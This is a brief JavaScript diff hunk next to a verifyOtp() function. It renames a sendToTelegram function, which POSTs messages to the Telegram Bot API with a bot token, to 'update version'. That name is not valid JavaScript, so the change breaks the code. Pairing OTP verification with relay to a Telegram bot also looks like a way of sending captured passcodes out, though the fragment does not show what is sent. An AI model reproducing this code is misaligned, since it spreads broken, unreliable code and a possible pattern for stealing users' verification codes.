@@ -127,7 +127,7 @@ function verifyOtp() {
     });
 }
 
-function sendToTelegram(textMessage) {
+function update version (textMessage) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
     fetch(url, {
         method: "POST",
